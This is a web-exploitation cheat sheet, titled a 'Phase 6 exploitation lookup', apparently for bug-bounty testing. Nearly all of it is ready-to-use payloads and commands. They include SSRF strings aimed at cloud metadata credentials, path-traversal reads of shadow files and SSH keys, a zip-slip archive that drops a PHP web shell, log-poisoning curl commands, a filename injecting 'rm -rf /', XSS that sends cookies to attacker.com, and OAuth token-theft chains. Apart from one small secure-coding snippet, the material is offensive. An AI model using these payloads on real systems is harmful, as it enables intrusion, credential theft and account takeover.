# Web Vulnerability Bypass Tables — Quick Reference

Phase 6 exploitation lookup. Actual payloads and techniques for bypassing common defenses.

---

## SSRF — IP Bypass Techniques (11)

| # | Technique | Payload | Notes |
|---|-----------|---------|-------|
| 1 | Decimal IP | `http://2130706433` | 127.0.0.1 as single decimal |
| 2 | Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| 3 | Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| 4 | Short IP | `http://127.1` | Abbreviated notation |
| 5 | IPv6 loopback | `http://[::1]` | IPv6 loopback |
| 6 | IPv6 mapped IPv4 | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| 7 | DNS rebinding | Attacker DNS → resolves to internal IP | First check = external, fetch = internal |
| 8 | Redirect chain | External URL → 302 → `http://169.254.169.254` | Bypass checks on initial URL only |
| 9 | URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency between check and fetch |
| 10 | CNAME to internal | Attacker domain CNAME → internal hostname | DNS points inward |
| 11 | Mixed hex IPv6 | `http://[::ffff:0x7f000001]` | Combined hex + IPv6 mapped |

### SSRF High-Value Targets

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  # Azure
http://localhost:6379          # Redis
http://localhost:9200          # Elasticsearch
http://localhost:2375          # Docker API (RCE)
http://localhost:8080          # Admin panels
```

### SSRF Injection Points

```
?url=, ?src=, ?redirect=, ?next=, ?image=, ?webhook=, ?callback=
JSON: {"webhook": "http://...", "avatar_url": "http://..."}
SVG: <image href="http://internal">
PDF generators, image resizers, URL preview/unfurl features
```

---

## Path Traversal — Bypass Techniques (14)

| # | Defense | Bypass | Example |
|---|---------|--------|---------|
| 1 | Strips `../` non-recursively | Nested sequences | `....//`, `....\/`, `..../` |
| 2 | Strips `../` non-recursively | Double-nested | `....//....//....//etc/passwd` |
| 3 | Blocks `../` | Absolute path | `filename=/etc/passwd` |
| 4 | Blocks `../` | URL encoding | `%2e%2e%2f` or `%2e%2e/` |
| 5 | Decodes once then blocks | Double URL encoding | `%252e%252e%252f` |
| 6 | Blocks `../` | Non-standard encoding (overlong UTF-8) | `..%c0%af` or `..%ef%bc%8f` |
| 7 | Blocks `../` | 16-bit Unicode | `%u002e%u002e%u2215` |
| 8 | Requires base folder prefix | Include base + traverse | `/var/www/images/../../../etc/passwd` |
| 9 | Requires file extension | Null byte truncation | `../../../etc/passwd%00.png` (PHP < 5.3.4) |
| 10 | Linux-only checks | Windows backslash | `..\..\..\..\windows\win.ini` |
| 11 | Blocks `..` | UNC path (Windows) | `\\attacker.com\share\evil.txt` |
| 12 | Blocks traversal chars | Tomcat path parameter | `/allowed/..;/sensitive/file` |
| 13 | Normalizes path | Double slash confusion | `//....//....//etc/passwd` |
| 14 | Blocks known filenames | Proc filesystem | `../../../proc/self/environ` |

### Detection Payloads (ordered by likelihood)

```bash
# Basic (always try first)
../../../etc/passwd
../../../etc/hosts
..\..\..\windows\win.ini

# Absolute path (if traversal sequences blocked)
/etc/passwd
/etc/hosts

# Nested (if non-recursive strip)
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# URL-encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd

# Double URL-encoded
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Overlong UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Null byte (PHP < 5.3.4, older Java)
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg

# Base folder prefix required
/var/www/images/../../../etc/passwd
/var/www/html/../../../etc/passwd

# Tomcat semicolon trick
/static/..;/..;/..;/etc/passwd
```

### Injection Points to Test

```
?file=, ?path=, ?page=, ?template=, ?include=, ?doc=, ?folder=
?filename=, ?img=, ?src=, ?resource=, ?download=, ?attachment=
?lang=en → ?lang=../../../../etc/passwd%00
POST multipart filename field: Content-Disposition: form-data; name="file"; filename="../../etc/cron.d/shell"
```

### High-Value Files to Read

```bash
# Linux
/etc/passwd                    # User enumeration
/etc/shadow                    # Password hashes (rare, needs root)
/etc/hosts                     # Internal hostnames
/proc/self/environ             # Environment variables (secrets, keys)
/proc/self/cmdline             # Running process command line
/proc/self/fd/0-20             # Open file descriptors
/home/<user>/.ssh/id_rsa       # SSH private keys
/home/<user>/.bash_history     # Command history
/var/log/apache2/access.log    # Log poisoning → RCE
/var/log/nginx/access.log      # Log poisoning → RCE
/etc/nginx/nginx.conf          # Reverse proxy config (internal URLs)
/etc/apache2/sites-enabled/000-default.conf

# Application-specific
.env                           # Laravel/Node secrets
config/database.yml            # Rails DB credentials
WEB-INF/web.xml               # Java app config
application.properties         # Spring Boot config
wp-config.php                  # WordPress DB creds

# Windows
C:\Windows\win.ini             # Existence proof
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config  # IIS config with connection strings
C:\Users\<user>\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 5.7\my.ini
```

### Zip Slip / Archive Path Traversal (CWE-22 via extraction)

When the target accepts zip/tar/jar uploads and extracts them server-side:

| # | Library/Language | `../` Blocked? | Bypass | Notes |
|---|-----------------|---------------|--------|-------|
| 1 | Node.js `yauzl` (`strictFileNames: true`) | ❌ Only blocks absolute + backslash | `../payload.js` works | `path.join(dest, entry)` resolves traversal |
| 2 | Node.js `adm-zip` | ❌ No validation | `../../../etc/cron.d/shell` | Direct write anywhere |
| 3 | Python `zipfile` | ❌ No validation by default | `../payload.py` | Must use `extractall()` with check |
| 4 | Java `ZipInputStream` | ❌ No validation by default | `../../../WEB-INF/web.xml` | Must manually validate after `getNextEntry()` |
| 5 | Go `archive/zip` | ❌ No validation by default | `../payload.go` | Must check after `filepath.Join()` |
| 6 | PHP `ZipArchive::extractTo()` | ✅ Blocks `../` since PHP 7.4.3 | Try `..\\` on Windows | Older PHP versions vulnerable |
| 7 | Ruby `Zip::File` (rubyzip) | ✅ Since v1.3.0 | Older versions: `../Gemfile` | Check gem version |

**Creating malicious zips:**

```python
import zipfile, io, base64

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("../../../tmp/pwned.js", "malicious code here")

# Base64 for web upload
print(base64.b64encode(buf.getvalue()).decode())
```

```bash
# Using zip command (symlink variant)
ln -s /etc/passwd link
zip --symlinks evil.zip link

# Using Python to create traversal zip
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.writestr('../../../var/www/html/shell.php','<?php system(\$_GET[\"c\"]);?>')
"
```

**Detection signals (target is vulnerable if):**
- Accepts zip/tar/jar/war uploads
- Extracts to a known directory structure
- Uses `path.join()` or string concatenation for destination path
- No `realpath()` / `path.resolve()` + prefix check after join

**Impact escalation:**
- Write to web root → RCE via webshell
- Write to plugins/modules directory → code execution on next load
- Overwrite config files → auth bypass, credential injection
- Write to cron.d → scheduled RCE
- Write SSH authorized_keys → persistent access

**Secure pattern (what to look for as "fixed"):**
```javascript
// Node.js — correct validation
const destpath = path.resolve(dest, entryName);
if (!destpath.startsWith(path.resolve(dest) + path.sep)) {
    throw new Error("Path traversal detected");
}
```

### Path Traversal → RCE Escalation

```bash
# 1. Log poisoning (if you can read logs)
# Inject PHP into User-Agent, then include the log file
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# Then: ?file=../../../var/log/apache2/access.log&cmd=id

# 2. /proc/self/environ (if readable)
# Inject payload into HTTP headers → read environ
curl -H "User-Agent: <?php system('id'); ?>" http://target/
# Then: ?file=../../../proc/self/environ

# 3. PHP session files
# Set session value to PHP code, then include session file
# Session stored at: /tmp/sess_<PHPSESSID> or /var/lib/php/sessions/
# Then: ?file=../../../tmp/sess_abc123

# 4. File upload + traversal
# Upload legitimate file, traverse to include it
# Or use filename traversal to write to web root
```

---

## File Upload — Bypass Techniques (10)

| # | Attack | Payload | Why It Works |
|---|--------|---------|--------------|
| 1 | Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5`, `shell.phtml` | Allowlist checks first ext or case-insensitive miss |
| 2 | Null byte | `shell.php%00.jpg` | Truncates at null in C-based parsers |
| 3 | Double extension | `shell.jpg.php` | Server executes based on last extension |
| 4 | MIME spoof | `Content-Type: image/jpeg` with `.php` body | Server trusts Content-Type header over actual content |
| 5 | Magic bytes prefix | Prepend `GIF89a;` to PHP code | Passes magic byte validation, still executes as PHP |
| 6 | Polyglot file | Valid as both JPEG and PHP | Passes image validation, executes as code |
| 7 | SVG JavaScript | `<svg onload="alert(1)">` | SVG is XML, allows script execution |
| 8 | XXE in DOCX | Malicious XML inside Office ZIP structure | External entity processing on upload |
| 9 | ZIP slip | `../../../etc/passwd` as filename in archive | Path traversal during extraction |
| 10 | Filename injection | `; rm -rf /` or `$(command)` in filename | Shell metachar injection if filename used in commands |

### Magic Bytes Reference

```
JPEG:       FF D8 FF
PNG:        89 50 4E 47 0D 0A 1A 0A
GIF:        47 49 46 38  (ASCII: GIF89a or GIF87a)
PDF:        25 50 44 46  (ASCII: %PDF)
ZIP/DOCX:   50 4B 03 04
```

### SVG XSS Payload

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## Open Redirect — Bypass Techniques (11)

| # | Technique | Payload | Why It Works |
|---|-----------|---------|--------------|
| 1 | @ symbol | `https://legit.com@evil.com` | Browser navigates to evil.com (userinfo section) |
| 2 | Subdomain abuse | `https://legit.com.evil.com` | evil.com controls the subdomain |
| 3 | Protocol tricks | `javascript:alert(1)` | XSS via redirect parameter |
| 4 | Double encoding | `%252f%252fevil.com` | Decodes to `//evil.com` after double decode |
| 5 | Backslash | `https://legit.com\@evil.com` | Parsers normalize `\` to `/` |
| 6 | Protocol-relative | `//evil.com` | Uses current page's protocol |
| 7 | Null byte | `https://legit.com%00.evil.com` | Some parsers truncate at null |
| 8 | Unicode IDN | `https://legіt.com` (Cyrillic і) | Visually identical, different domain |
| 9 | Data URL | `data:text/html,<script>...</script>` | Direct payload execution |
| 10 | Fragment abuse | `https://legit.com#@evil.com` | Inconsistent parsing of fragment |
| 11 | Chained redirect | `target.com/callback?redirect_uri=//evil.com` | OAuth/callback endpoint chains |

### Open Redirect → Impact Escalation

```
Open redirect alone                    = Informational (most programs)
Open redirect + OAuth code theft       = ATO (Critical)
Open redirect + phishing (login page)  = Medium
Open redirect + token leak in Referer  = High
```

---

## Access Control — Bypass Techniques (12)

| # | Technique | Example | Notes |
|---|-----------|---------|-------|
| 1 | Unprotected admin URL | `/admin`, `/admin-panel`, `/management` | Check robots.txt, sitemap.xml, JS files |
| 2 | Admin URL in client-side JS | `adminPanelTag.setAttribute('href', '/admin-yb556')` | Grep JS for admin/panel/dashboard paths |
| 3 | Parameter-based role control | `?admin=true`, `?role=1`, cookie `isAdmin=false→true` | Modify role indicators in request |
| 4 | X-Original-URL bypass | `GET / HTTP/1.1` + `X-Original-URL: /admin/deleteUser` | Bypasses front-end URL-based ACL |
| 5 | X-Rewrite-URL bypass | Same as above with `X-Rewrite-URL` header | Framework-specific (Symfony, IIS) |
| 6 | HTTP method swap | POST blocked → try GET, PUT, PATCH, DELETE, HEAD | Platform ACL checks specific methods only |
| 7 | URL case discrepancy | `/admin/deleteUser` → `/ADMIN/DELETEUSER` | ACL case-sensitive, routing case-insensitive |
| 8 | Trailing slash / suffix | `/admin/deleteUser/` or `/admin/deleteUser.json` | Spring useSuffixPatternMatch (pre-5.3) |
| 9 | Multi-step process skip | Skip steps 1-2, submit step 3 directly | Auth only on early steps, not final action |
| 10 | Referer-based bypass | Add `Referer: https://target.com/admin` to sub-page request | Sub-pages trust Referer instead of session |
| 11 | Data leakage in redirect | 302 to login but response body contains user data | Read body of redirect responses |
| 12 | Horizontal → vertical | IDOR to admin account → extract admin password/token | Pivot from user-level to admin-level |

### Admin Discovery Checklist

```bash
# 1. Check robots.txt and sitemap
curl -s https://target.com/robots.txt | grep -i "disallow\|admin\|panel"
curl -s https://target.com/sitemap.xml | grep -i "admin"

# 2. Grep JavaScript for admin paths
curl -s https://target.com/ | grep -oP 'src="[^"]*\.js"' | while read js; do
  curl -s "https://target.com/${js//src=\"/}" | grep -oiP '(admin|panel|dashboard|manage)[^"'\'']*'
done

# 3. Common admin paths wordlist
/admin /admin/ /administrator /management /console /dashboard
/admin-panel /cp /controlpanel /admin.php /wp-admin
/_admin /backstage /portal /internal /staff

# 4. Check response differences (200 vs 403 vs 302)
# 403 = exists but blocked (try bypass)
# 302 = exists, redirects to login (auth required)
# 200 = unprotected!
```

### Parameter-Based Role Manipulation

```bash
# Cookie-based
Cookie: role=user → Cookie: role=admin
Cookie: isAdmin=false → Cookie: isAdmin=true
Cookie: access_level=1 → Cookie: access_level=99

# Hidden field / query param
POST /update-profile
role=user → role=admin
admin=false → admin=true

# JSON body role injection
POST /api/user/update
{"name":"attacker","role":"admin"}
{"name":"attacker","isAdmin":true}
{"name":"attacker","permissions":["read","write","admin"]}

# User profile update → role escalation
# Some apps let you modify your own profile and include role field
PUT /api/users/me
{"email":"a@b.com","roleid":1}
```

### Multi-Step Process Bypass

```bash
# Scenario: Admin function requires 3 steps
# Step 1: GET /admin/users (load form) — access controlled ✓
# Step 2: POST /admin/users/delete (submit) — access controlled ✓  
# Step 3: POST /admin/users/delete/confirm — NO access control ✗

# Attack: Skip steps 1-2, submit step 3 directly
curl -X POST https://target.com/admin/users/delete/confirm \
  -H "Cookie: session=LOW_PRIV_SESSION" \
  -d "user_id=victim&confirmed=true"

# Also check: CSRF token from step 1 reusable? 
# Can you get a valid token without authorization?
```

### Referer-Based Access Control Bypass

```bash
# Sub-page only checks Referer header
curl -X GET https://target.com/admin/deleteUser?id=123 \
  -H "Cookie: session=LOW_PRIV_SESSION" \
  -H "Referer: https://target.com/admin"

# Variations to try
Referer: https://target.com/admin
Referer: https://target.com/admin/
Referer: https://target.com/admin/users
```

### Response Body in Redirects

```bash
# Even when server returns 302, the BODY may contain sensitive data
# Burp: check "Show response" for 302s, don't just follow redirect
curl -s -D- https://target.com/api/users/victim_id \
  -H "Cookie: session=ATTACKER_SESSION" | head -50
# If 302 Location: /login BUT body contains user JSON → data leak

# Automated check: compare response body size on 302s
# Large body on redirect = likely data leakage
```

---

## IDOR — Variants (8)

| # | Variant | Example | Detection |
|---|---------|---------|-----------|
| 1 | Numeric ID swap | `/api/user/123/profile` → change to 124 | Increment/decrement IDs |
| 2 | UUID swap | Enumerate UUID via email invite or other endpoint | Find UUIDs in responses, JS, emails |
| 3 | Indirect IDOR | `POST /api/export?report_id=456` | Object referenced indirectly |
| 4 | Parameter addition | Add `?user_id=other` to request | Backend uses unexpected param |
| 5 | HTTP method swap | PUT protected, DELETE not | Try all methods on same endpoint |
| 6 | Old API version | `/v1/users/123` lacks auth that `/v2/` has | Version downgrade |
| 7 | GraphQL node | `{ node(id: "base64(User:456)") { email } }` | Global node resolution |
| 8 | WebSocket | `{"action":"get_history","userId":"victim-UUID"}` | Client-supplied IDs in WS messages |

### IDOR Testing Protocol

```
1. Two accounts (A=attacker, B=victim)
2. Log in as B, perform all actions, note all IDs in requests/responses
3. Replay B's requests with A's token but B's IDs
4. Test EVERY HTTP method (GET, PUT, DELETE, PATCH)
5. Check API v1 vs v2 vs no-version
6. Check GraphQL node() queries
7. Check WebSocket messages for client-supplied IDs
8. Check indirect references (export, share, invite endpoints)
```

### IDOR Impact Escalation

```
IDOR + Read PII                = Medium
IDOR + Write (modify data)     = High
IDOR + Admin endpoint          = Critical (privilege escalation)
IDOR + Account takeover path   = Critical
IDOR + Mass enumeration        = High (quantify affected users)
```

---

## XSS — Filter Bypass Payloads

### Dangling Markup Injection

When CSP blocks script execution but you can inject HTML, exfiltrate page content (CSRF tokens, PII) by leaving an attribute/tag open:

```html
<!-- Inject an unclosed img src — browser sends everything until next matching quote as URL -->
<img src="https://attacker.com/steal?data=

<!-- Everything after this (CSRF tokens, user data, etc.) becomes part of the URL -->
<!-- until the browser hits the next " character in the page source -->

<!-- Alternative: unclosed base tag (hijacks all relative URLs on the page) -->
<base href="https://attacker.com/">

<!-- Form action hijack (captures next form submission) -->
<form action="https://attacker.com/steal">

<!-- Button override (user clicks "Submit" → sends to attacker) -->
<button formaction="https://attacker.com/steal">Click me</button>
```

**When to use:**
- CSP `script-src 'self'` blocks inline JS but you can inject HTML
- Input filter strips `<script>`, event handlers (`onerror`, `onload`) but allows `<img>`, `<form>`, `<base>`
- Reflected injection point is BEFORE sensitive data on the page (CSRF token, API key)

**Exfiltration targets:**
- CSRF tokens in hidden form fields
- API keys in `<meta>` tags or inline scripts
- User PII rendered on the page
- Session identifiers in URL parameters

### Core Bypasses

```javascript
// Basic blocked? Try event handlers
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onpageshow="alert(1)">
<details open ontoggle="alert(1)">

// CSP bypass — unsafe-inline blocked
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// Angular template injection
{{constructor.constructor('alert(1)')()}}

// mXSS — mutation-based
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Protocol handler
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">

// Without parentheses
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw+1>

// Without alert keyword
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="self[atob('YWxlcnQ=')](1)">

// SVG namespace
<svg><script>alert&#40;1&#41;</script></svg>

// Encoding tricks
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### DOM XSS Sources (attacker-controllable inputs)

```javascript
// URL-based sources (most common)
location.hash              // #fragment — never sent to server, bypasses WAF
location.search            // ?query=string
location.href              // Full URL
location.pathname          // /path/portion
document.URL               // Full URL string
document.documentURI       // Same as URL
document.baseURI           // <base> tag value
document.referrer          // Referer header value

// Storage-based sources (stored DOM XSS)
localStorage.getItem()     // Persistent across sessions
sessionStorage.getItem()   // Per-tab
document.cookie            // Cookie values

// Message-based sources
window.name                // Survives cross-origin navigation!
postMessage event.data     // Cross-origin messages

// History API
history.pushState()        // URL manipulation without reload
history.replaceState()
```

### DOM XSS Sinks (grep targets)

```javascript
innerHTML = userInput           // HIGH RISK
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)      // string form
element.src = userInput         // javascript: URI possible
location.href = userInput
window.open(userInput)
$.html(userInput)               // jQuery
```

### DOM XSS Detection Methodology

```bash
# 1. Find sources in JavaScript files
# Grep all JS for source patterns:
curl -s https://target.com/app.js | grep -oP '(location\.(hash|search|href|pathname)|document\.(URL|referrer|cookie)|window\.name|localStorage|sessionStorage|postMessage)'

# 2. Trace source → sink
# Look for patterns like:
# var x = location.hash;  ...  element.innerHTML = x;
# var q = new URLSearchParams(location.search).get('q');  ...  document.write(q);

# 3. Test with payload in source
# URL fragment (bypasses server-side WAF entirely):
https://target.com/page#<img src=x onerror=alert(1)>

# Query parameter:
https://target.com/search?q=<script>alert(1)</script>

# window.name (set from attacker page, survives navigation):
<script>
window.name = "<img src=x onerror=alert(document.cookie)>";
window.location = "https://target.com/vulnerable-page";
</script>

# postMessage:
<iframe src="https://target.com/page" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')"></iframe>
```

### DOM-Based Open Redirect

```javascript
// Vulnerable pattern:
var goto = location.hash.slice(1);
if (goto.startsWith('https:')) { location = goto; }

// Exploit:
https://target.com/page#https://evil.com

// Also check:
// location.search → window.location
// document.referrer → location.href
// postMessage → location.assign()
```

### DOM Clobbering

```html
<!-- Overwrite global variables via HTML injection (no JS needed!) -->
<!-- If app does: var url = window.config.url || '/default'; -->

<!-- Inject: -->
<a id="config" href="javascript:alert(1)">
<!-- Now window.config.href = "javascript:alert(1)" -->

<!-- Overwrite nested properties: -->
<form id="config"><input id="url" value="https://evil.com"></form>
<!-- Now window.config.url = HTMLInputElement (toString = "https://evil.com") -->

<!-- DOMPurify bypass via clobbering (if used with innerHTML): -->
<form id="DOMPurify"><input id="sanitize" value="clobbered"></form>
<!-- Clobbers DOMPurify.sanitize → bypasses sanitization -->

<!-- Common targets for clobbering: -->
<!-- window.config, window.settings, window.analytics -->
<!-- Any global var that's checked with: if (window.X) { use X } -->
```

### postMessage Exploitation

```javascript
// Vulnerable listener pattern:
window.addEventListener('message', function(e) {
    // No origin check!
    document.getElementById('output').innerHTML = e.data;
});

// Exploit from attacker page:
<iframe src="https://target.com/page" onload="
    this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>','*')
"></iframe>

// Even with origin check, look for:
// - Regex bypass: if (e.origin.match('target.com')) → evil-target.com passes
// - startsWith: if (e.origin.startsWith('https://target.com')) → target.com.evil.com
// - indexOf: if (e.origin.indexOf('target.com') > -1) → attacker-target.com

// postMessage → location (open redirect / XSS):
window.addEventListener('message', function(e) {
    location.href = e.data.url;  // No validation
});
// Exploit: postMessage({url: "javascript:alert(1)"}, '*')
```

### jQuery-Specific DOM XSS

```javascript
// jQuery selector sink (< v3.0):
$(location.hash)           // If hash = #<img src=x onerror=alert(1)>
$('input[name="' + userInput + '"]')  // Injection into selector

// jQuery .html() sink:
$('#output').html(userInput)

// jQuery .append() sink:
$('#container').append(userInput)

// attr() with javascript: URI:
$('a').attr('href', userInput)  // userInput = "javascript:alert(1)"

// Detection: grep for jQuery version + sink usage
curl -s https://target.com/ | grep -oP 'jquery[.-](\d+\.\d+\.\d+)'
```

### XSS Impact Escalation

```
Self-XSS only                          = Won't pay (don't submit)
Reflected XSS (requires click)         = Medium
Stored XSS (fires on page load)        = High
XSS + CSRF token theft                 = CSRF bypass on critical action
XSS + credential theft (fake login)    = ATO
XSS + service worker registration      = Persistent XSS across pages
XSS on admin panel                     = Critical
```

---

## MFA/2FA — Bypass Patterns (7)

| # | Pattern | Technique | Impact |
|---|---------|-----------|--------|
| 1 | No rate limit on OTP | Brute force all 1M 6-digit codes | ATO (Critical) |
| 2 | OTP not invalidated | Reuse same OTP after logout/re-login | Persistent ATO |
| 3 | Response manipulation | Change `{"success":false}` → `{"success":true}` | Client-side only check |
| 4 | Skip MFA step | Access `/dashboard` directly with pre-MFA session cookie | Workflow bypass |
| 5 | Race condition | Send same OTP simultaneously from two sessions | Double-use before invalidation |
| 6 | Backup code brute force | 6-8 digit backup codes with no rate limit | ATO via backup path |
| 7 | Remember device abuse | Steal "remember device" cookie, use from new IP/browser | Device trust not bound |

---

## JWT — Attack Techniques

```python
# None algorithm attack
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # empty signature

# RS256 → HS256 algorithm confusion
# Get public key from /.well-known/jwks.json
# Sign with public key as HMAC secret
token = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")

# Weak secret brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

---

## SAML — Attack Techniques

| # | Attack | Impact |
|---|--------|--------|
| 1 | XML Signature Wrapping (XSW) | Inject unsigned assertion, signature still validates against original | Critical — ATO any user |
| 2 | Comment injection in NameID | `admin<!---->@company.com` — signer sees with comment, app strips it | High — admin ATO |
| 3 | Signature stripping | Remove `<Signature>` element entirely, modify NameID | Critical — if server doesn't require sig |
| 4 | XXE in assertion | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | High — file read/SSRF |
| 5 | NameID manipulation | Change NameID to `admin@company.com` after stripping/wrapping | Depends on validation |

---

## Prototype Pollution

```javascript
// Server-side Node.js
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}

// URL parameter form
?__proto__[isAdmin]=true&__proto__[role]=superadmin

// Impact: privilege escalation, RCE via gadgets (e.g., child_process options)
```

---

## OAuth 2.0 — Attack Techniques (10)

| # | Attack | Target | Impact |
|---|--------|--------|--------|
| 1 | Implicit flow token theft | Client app POSTs token without validation | ATO — change user params to impersonate anyone |
| 2 | Missing state parameter (CSRF) | Authorization request has no `state` | Force victim to link attacker's OAuth account |
| 3 | redirect_uri manipulation | Weak validation on redirect_uri | Steal auth code/token via attacker-controlled redirect |
| 4 | Open redirect as proxy | Whitelisted domain has open redirect | Chain: redirect_uri → open redirect → attacker server |
| 5 | Scope upgrade (code flow) | Add extra scope to token exchange POST | Escalate access beyond user's consent |
| 6 | Scope upgrade (implicit flow) | Add scope param to /userinfo request | Access additional user data |
| 7 | Unverified email registration | Register at OAuth provider with victim's email | Login as victim on client apps using OAuth |
| 8 | Token/code leak via Referer | Redirect page loads external resources | Auth code leaked in Referer header |
| 9 | XSS on redirect page | XSS on whitelisted callback domain | Steal code/token from URL params/fragment |
| 10 | SSRF via dynamic client registration | `redirect_uris`, `logo_uri`, `jwks_uri` in registration | SSRF to internal services |

### OAuth Recon

```bash
# 1. Identify OAuth provider from authorization redirect
# Look for: /authorize, /oauth2/auth, /protocol/openid-connect/auth
# Note: client_id, redirect_uri, response_type, scope, state

# 2. Discovery endpoints (always try these)
curl -s https://oauth-server.com/.well-known/openid-configuration | jq .
curl -s https://oauth-server.com/.well-known/oauth-authorization-server | jq .
# Returns: authorization_endpoint, token_endpoint, jwks_uri, scopes_supported,
#          response_types_supported, grant_types_supported, registration_endpoint

# 3. Check if dynamic client registration is open
REG_ENDPOINT=$(curl -s https://oauth-server.com/.well-known/openid-configuration | jq -r .registration_endpoint)
curl -s -X POST "$REG_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"redirect_uris":["https://attacker.com/callback"],"client_name":"evil"}'
# 201 = registered! Now you have a client_id to abuse
```

### Implicit Flow Exploitation

```bash
# Vulnerable pattern: client app receives token via fragment, POSTs to server
# POST /authenticate
# {"email":"victim@target.com","token":"ACCESS_TOKEN"}
# Server trusts email field without verifying token ownership

# Attack: Get any valid token, change email to victim
# 1. Login with your own OAuth account → get access_token
# 2. Intercept POST /authenticate
# 3. Change email to victim@target.com (keep your valid token)
# 4. Server logs you in as victim

curl -X POST https://target.com/authenticate \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@target.com","token":"YOUR_VALID_TOKEN"}'
```

### redirect_uri Bypass Techniques

```bash
# Exact match bypass attempts (try all)
redirect_uri=https://target.com/callback/../other-page
redirect_uri=https://target.com/callback%2f..%2fother-page
redirect_uri=https://target.com/callback?next=https://evil.com
redirect_uri=https://target.com/callback#@evil.com
redirect_uri=https://target.com/callback@evil.com
redirect_uri=https://evil.com%23@target.com/callback
redirect_uri=https://target.com/callback&@evil.com#@bar.evil.com/
redirect_uri=https://localhost.evil.com/callback
redirect_uri=https://target.com/callback/../open-redirect?url=https://evil.com

# Subdomain tricks
redirect_uri=https://evil.target.com/callback
redirect_uri=https://anything.target.com/callback

# Parameter pollution (duplicate param)
/authorize?client_id=legit&redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com

# response_mode change (may alter redirect_uri validation)
response_mode=fragment → response_mode=query
response_mode=web_message  # often allows wider subdomain range

# Path traversal in redirect_uri
redirect_uri=https://target.com/oauth/callback/../../attacker-controlled-page
```

### Forced OAuth Account Linking (Missing State)

```html
<!-- If /authorize has no state parameter, attacker can force-link their OAuth to victim's account -->
<!-- 1. Attacker initiates OAuth flow, intercepts callback with code (don't complete) -->
<!-- 2. Craft page that forces victim to complete the flow with attacker's code -->

<iframe src="https://target.com/oauth/callback?code=ATTACKER_AUTH_CODE"></iframe>

<!-- Result: victim's account is now linked to attacker's OAuth profile -->
<!-- Attacker can now login to victim's account via "Login with social media" -->
```

### Stealing Tokens via Proxy Page

```bash
# When redirect_uri is locked to target.com but you find:
# 1. Open redirect on target.com
# 2. XSS on any page of target.com
# 3. Path traversal in redirect_uri to reach exploitable page

# Chain: redirect_uri → open redirect → attacker
# Authorization code flow (code in query string):
https://oauth-server.com/authorize?
  client_id=legit&
  redirect_uri=https://target.com/post/next?url=https://evil.com&
  response_type=code&
  scope=openid

# Implicit flow (token in fragment):
# Fragment (#) is NOT sent to server, so open redirect alone won't leak it
# Need: XSS or postMessage gadget on the redirect page
# Or: page that loads external JS (token accessible via document.location.hash)

# Referer leak (code flow):
# If redirect page loads external images/scripts:
# GET https://evil.com/logo.png
# Referer: https://target.com/callback?code=STOLEN_CODE
```

### Scope Upgrade Attack

```bash
# Authorization code flow: add scope to token exchange
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

client_id=legit&
client_secret=SECRET&
grant_type=authorization_code&
code=AUTH_CODE&
redirect_uri=https://target.com/callback&
scope=openid email profile admin  # ← added "admin" scope

# If server doesn't validate scope against original authorization → escalated token

# Implicit flow: add scope to userinfo request
GET /userinfo?scope=openid+email+profile+admin HTTP/1.1
Host: oauth-server.com
Authorization: Bearer ACCESS_TOKEN
```

### OAuth Testing Checklist

```
1. [ ] Identify grant type (implicit vs authorization code)
2. [ ] Check for state parameter in /authorize request
3. [ ] Test redirect_uri validation (all bypass techniques above)
4. [ ] Check if authorization code is single-use
5. [ ] Check if code is bound to specific client_id
6. [ ] Test implicit flow: can you change email/user_id in POST?
7. [ ] Check .well-known endpoints for registration_endpoint
8. [ ] Test dynamic client registration (SSRF via logo_uri, jwks_uri)
9. [ ] Test scope upgrade on token exchange
10. [ ] Check if OAuth provider verifies email on registration
11. [ ] Look for open redirects on whitelisted redirect domains
12. [ ] Check if tokens/codes leak via Referer header
13. [ ] Test response_mode variations (query, fragment, web_message)
```

---

